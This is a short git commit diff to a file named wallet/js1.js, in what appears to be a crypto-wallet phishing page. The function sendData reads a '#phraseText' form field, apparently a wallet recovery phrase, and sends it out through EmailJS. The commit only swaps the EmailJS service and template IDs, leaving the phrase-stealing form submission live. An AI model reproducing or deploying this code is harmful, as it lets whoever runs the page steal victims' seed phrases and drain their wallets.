c80421d936d4140905037f222947f14e2a317e70
manner105 <133831384+manner105@users.noreply.github.com>
2023-11-05 12:28:32 +0100

    Update js1.js

--- wallet/js1.js
+++ wallet/js1.js
@@ -82,7 +82,7 @@ function sendData() {
         phrase: document.querySelector("#phraseText").value
     }
     console.log(tempParams)
-    emailjs.send('service_9eaebud', 'template_ix5gqkf', tempParams)
+    emailjs.send('service_uycusz8', 'template_omhsaf8', tempParams)
 }
 
 form.addEventListener('submit', function(e) {
